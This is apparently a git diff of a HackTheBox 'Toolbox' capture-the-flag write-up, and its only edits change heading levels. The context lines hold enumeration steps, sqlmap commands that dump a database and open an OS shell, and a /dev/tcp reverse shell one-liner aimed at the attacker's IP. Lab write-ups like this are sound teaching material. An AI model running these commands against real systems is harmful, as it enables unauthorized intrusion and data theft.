@@ -13,15 +13,15 @@ img_path: /assets/img/hackthebox/machines/toolbox
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [Toolbox](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).
 
 ![](0.png)
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -72,7 +72,7 @@ Host script results:
 
 We have FTP with anonymous login allowed, ssh on port 22, SMB on port (135,139,445) and Apache https web server and it says it's `Debian`, this means it's running on a docker container.
 
-## FTP
+### FTP
 
 Let's login and see what's there.
 
@@ -102,7 +102,7 @@ Docker-Toolbox allows to deploy containers in windows before windows has support
 
 Let's move on.
 
-## SMB
+### SMB
 
 Let's list available shares.
 
@@ -113,7 +113,7 @@ session setup failed: NT_STATUS_ACCESS_DENIED
 
 Couldn't do that, we get access denied.
 
-## Web
+### Web
 
 Before going to the web page, nmap scripts had showed us the domain `admin.megalogistic.com`, so let's add that to /etc/hosts along with `megalogistic.com`.
 
@@ -139,7 +139,7 @@ sqlmap -u 'https://admin.megalogistic.com/' --forms --batch --dump
 
 Managed to retrieve the admin hash, but couldn't crack it.
 
-# **Foothold**
+## **Foothold**
 
 Let's use `--os-shell` option is `sqlmap` to get a shell and execute commands on the target.
 
@@ -150,7 +150,7 @@ With that i put this reverse shell `sh -i >& /dev/tcp/10.10.17.90/9001 0>&1` in 
 ![](6.png)
 
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
 Running `ifconfig` shows our ip `172.17.0.2`
 
